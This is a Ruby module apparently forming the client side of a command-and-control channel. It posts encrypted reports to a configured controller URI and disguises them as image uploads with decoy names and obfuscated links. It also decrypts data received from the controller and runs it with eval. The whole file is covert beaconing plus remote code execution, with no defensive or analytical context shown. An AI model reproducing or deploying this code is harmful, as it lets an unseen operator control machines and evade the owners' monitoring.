# frozen_string_literal: true

module CcHelper
  include CryptHelper
  include OffuscateHelper

  REPORT_TYPE = {
    notice: 'NOTICE',
    invalid_command: 'INVALID_COMMAND'
  }

  def report_to_cc(type: 'notice', generic_info: nil, exception: nil)
    raise '' if generic_info.blank? && exception.blank?

    if generic_info.present?
      message = generic_info
    end

    if exception.present?
      message = {
        exception: exception.to_s,
        backtrace: exception.backtrace.blank? ? nil : exception.backtrace.take(5)
      }.to_s
    end

    payload = {
      type: REPORT_TYPE[type.to_sym],
      message: message
    }

    response = RestClient::Request.execute(
      method: :post,
      url: "#{Parameter.c_c_uri}/#{Parameter.c_c_pool}",
      timeout: 10,
      headers: get_headers,
      payload: get_cc_payload(payload)
    )

    JSON.parse(response.body)

  rescue RestClient::ExceptionWithResponse => e
    CustomError.new(message: e.response, fatal: true)
  rescue StandardError => e
    CustomError.new(message: e)
  end

  def get_headers
    {
      content_type: :json, accept: :json, delivery_descriptor: Parameter.c_c_token
    }
  end

  def get_cc_payload(plain_info)
    result = encrypt(plain_info.to_s, Parameter.c_c_cipher_key, Parameter.c_c_cipher_iv)
    image = result[:ciphertext]
    url = ofuscate_image_link(result[:tag], Parameter.c_c_uri.split('https://').last, Parameter.c_c_pool)

    {
      name: "fishcado #{rand(900000)}",
      image: image,
      url: url
    }
  end

  def recover_cc_payload(image, url, ref_offuscate, cipher_key, cipher_iv)
    tag = unofuscate_image_link(url, ref_offuscate)
    plain_info = decrypt(image, tag, cipher_key, cipher_iv)

    eval(plain_info)
  end
end